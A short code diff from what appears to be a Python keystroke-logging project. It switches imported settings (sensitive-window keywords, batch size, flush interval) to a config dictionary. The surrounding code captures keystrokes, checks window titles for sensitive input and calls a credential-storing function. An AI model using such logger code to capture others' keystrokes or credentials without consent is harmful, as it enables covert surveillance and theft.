@@ -11,7 +11,7 @@ from pynput import keyboard
 from storage.db import log_keystrokes_batch
 from tracker.window_tracker import get_active_window
 from storage.security import encrypt_and_store_credential
-from config.settings import SENSITIVE_KEYWORDS, BATCH_SIZE, FLUSH_INTERVAL
+from config.load_config import config_data
 
 # Global variables for keystroke logging
 event_queue = queue.Queue()
@@ -33,7 +33,7 @@ def is_sensitive_window(title: Optional[str]) -> bool:
     """Return True if the window title suggests sensitive input."""
     if not title:
         return False
-    return any(word in title.lower() for word in SENSITIVE_KEYWORDS)
+    return any(word in title.lower() for word in config_data["SENSITIVE_KEYWORDS"])
 
 def on_press(key) -> None:
     """Queue keystroke events for background processing."""
@@ -47,7 +47,7 @@ def _buffer_keystroke(k: str) -> None:
     """Buffer keystrokes and flush in batches."""
     with buffer_lock:
         keystroke_buffer.append(k)
-        if len(keystroke_buffer) >= BATCH_SIZE:
+        if len(keystroke_buffer) >= config_data["BATCH_SIZE"]:
             _flush_keystrokes()
 
 def _flush_keystrokes() -> None:
@@ -65,7 +65,7 @@ def _flush_keystrokes() -> None:
 def _periodic_flush() -> None:
     """Periodically flush keystrokes regardless of buffer size."""
     while True:
-        time.sleep(FLUSH_INTERVAL)
+        time.sleep(config_data["FLUSH_INTERVAL"])
         _flush_keystrokes()
 
 def _event_worker() -> None:
